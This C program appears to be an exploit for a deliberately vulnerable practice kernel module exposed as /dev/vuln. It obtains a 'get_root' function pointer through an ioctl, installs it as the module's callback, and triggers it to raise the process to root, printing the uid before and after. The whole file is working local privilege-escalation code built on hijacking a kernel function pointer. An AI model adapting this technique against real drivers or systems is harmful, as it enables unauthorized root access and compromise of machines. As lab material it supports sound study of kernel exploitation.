#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>

#include "../module/vuln.h"

int main(int argc, const char *argv[]) {

	int fd;
	void *get_root;

	if (!getuid()) {
		fprintf(stderr, "you are already root, no point in running exploit\n");
		return 1;
	}
	
	if ((fd = open("/dev/vuln", O_RDWR)) == -1) {
		perror("could not open /dev/vuln");
		return 1;
	}

	if (ioctl(fd, VULN_GET_ROOT, &get_root) == -1) {
		perror("could not get function pointer");
		return 1;
	}

	if (ioctl(fd, VULN_SET_FUNC, get_root) == -1) {
		perror("could not set function pointer");
		return 1;
	}

	printf("current uid: %d\n", getuid());
	printf("triggering exploit...\n");
	if (ioctl(fd, VULN_TRIGGER, 0) == -1) {
		perror("could not trigger vulnerability");
		return 1;
	}
	printf("current uid: %d\n", getuid());

	return 0;
}
